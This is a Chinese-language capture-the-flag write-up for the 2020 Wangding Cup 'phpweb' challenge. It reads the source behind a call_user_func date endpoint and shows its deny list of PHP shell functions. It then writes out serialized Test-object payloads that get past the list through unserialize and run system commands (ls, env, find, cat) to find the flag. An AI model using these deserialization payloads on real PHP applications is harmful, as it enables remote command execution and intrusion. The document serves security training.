### [网鼎杯 2020 朱雀组]phpweb

----

抓包发现POST了两个参数：联想到date函数

```
func=             &p= 
```

我们故意输错

通过报错我们可以发现使用的是`call_user_func`

```
func=file_get_contents&p=index.php
```

读出**index.php**的内容

```php
    <?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
    function gettime($func, $p) {
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];

    if ($func != null) {
        $func = strtolower($func);
        if (!in_array($func,$disable_fun)) {
            echo gettime($func, $p);
        }else {
            die("Hacker...");
        }
    }
    ?>
```

我们可以发现这个`Test`类,没有过滤，我们可以通过构造一个反序列化的Payload

```php
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
```

构造如下：
```php
<?php
class Test {
        var $p = "ls /";
        var $func = "system";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }

$a = new Test();
echo serialize($a);

O:4:"Test":2:{s:1:"p";s:4:"ls /";s:4:"func";s:6:"system";}
//我们传参数
func=unserialize&p=O:4:"Test":2:{s:1:"p";s:4:"ls /";s:4:"func";s:6:"system";}
```

![image-20241018154247165](https://gitee.com/bx33661/image/raw/master/path/image-20241018154247165.png)

发现成功了，我们读取根目录和当前目录都没有发现flag，我们尝试寻找环境变量：

```
func=unserialize&p=O:4:"Test":2:{s:1:"p";s:3:"env";s:4:"func";s:6:"system";}
```

![image-20241018154441873](https://gitee.com/bx33661/image/raw/master/path/image-20241018154441873.png)

也没有，我们尝试find

```
O:4:"Test":2:{s:1:"p";s:18:"find / -name flag*";s:4:"func";s:6:"system";}
```

![image-20241018154717933](https://gitee.com/bx33661/image/raw/master/path/image-20241018154717933.png)

最后---->cat

```
func=unserialize&p=O:4:"Test":2:{s:1:"p";s:22:"cat /tmp/flagoefiu4r93";s:4:"func";s:6:"system";}
```

![image-20241018154850895](https://gitee.com/bx33661/image/raw/master/path/image-20241018154850895.png)